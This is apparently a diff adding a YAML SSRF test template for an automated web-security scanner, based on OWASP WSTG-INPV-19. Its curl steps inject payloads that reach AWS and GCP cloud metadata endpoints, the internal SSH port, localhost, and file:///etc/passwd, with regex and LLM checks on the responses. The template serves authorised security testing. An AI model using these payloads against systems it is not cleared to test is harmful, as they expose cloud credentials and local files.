@@ -1,0 +1,80 @@
+id: WSTG-INPV-19
+name: Server-Side Request Forgery
+category: Input Validation
+severity: high
+references:
+  - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-side_Request_Forgery
+
+# The user supplies a URL endpoint and a parameter name known to fetch a
+# user-controlled URL (?url=, ?fetch=, ?next=, ?image=, etc.). We do NOT
+# auto-discover these — that's recon's job.
+target_schema:
+  required: [url, parameter]
+  optional: [collaborator_host]
+
+steps:
+  - name: cloud_metadata_aws
+    tool: curl
+    command: >-
+      curl -s "{{url}}?{{parameter}}=http://169.254.169.254/latest/meta-data/"
+    evaluators:
+      - type: regex
+        pattern: 'ami-id|instance-id|iam/|placement/|hostname$|local-hostname'
+        emit_finding:
+          vuln_type: SSRF (AWS IMDS reachable)
+          severity: critical
+
+  - name: cloud_metadata_gcp
+    tool: curl
+    when: no_finding_yet
+    command: >-
+      curl -s -H "Metadata-Flavor: Google" "{{url}}?{{parameter}}=http://metadata.google.internal/computeMetadata/v1/"
+    evaluators:
+      - type: regex
+        pattern: 'instance/|project/|service-accounts/'
+        emit_finding:
+          vuln_type: SSRF (GCP metadata reachable)
+          severity: critical
+
+  - name: internal_loopback
+    tool: curl
+    when: no_finding_yet
+    command: >-
+      curl -s "{{url}}?{{parameter}}=http://127.0.0.1:22"
+    evaluators:
+      - type: regex
+        pattern: 'SSH-\d|OpenSSH'
+        emit_finding:
+          vuln_type: SSRF (internal SSH port reachable)
+          severity: high
+
+  - name: file_scheme
+    tool: curl
+    when: no_finding_yet
+    command: >-
+      curl -s "{{url}}?{{parameter}}=file:///etc/passwd"
+    evaluators:
+      - type: regex
+        pattern: 'root:.*:0:0:|/bin/(bash|sh)'
+        emit_finding:
+          vuln_type: SSRF (file:// scheme — local file disclosure)
+          severity: critical
+
+  - name: llm_judge_ambiguous
+    tool: curl
+    when: no_finding_yet
+    command: >-
+      curl -s "{{url}}?{{parameter}}=http://localhost:80"
+    evaluators:
+      - type: llm
+        instruction: >-
+          The endpoint may fetch a user-supplied URL. The response is what
+          came back when we asked it to fetch http://localhost:80. Set
+          matched=true if the response looks like content from an *internal*
+          service (e.g. internal admin page, default web server banner,
+          unexpected HTML) rather than a clean error or the parameter being
+          rejected. False positives are acceptable here — we'll verify
+          manually.
+        emit_finding:
+          vuln_type: SSRF (suspected — LLM judged)
+          severity: medium
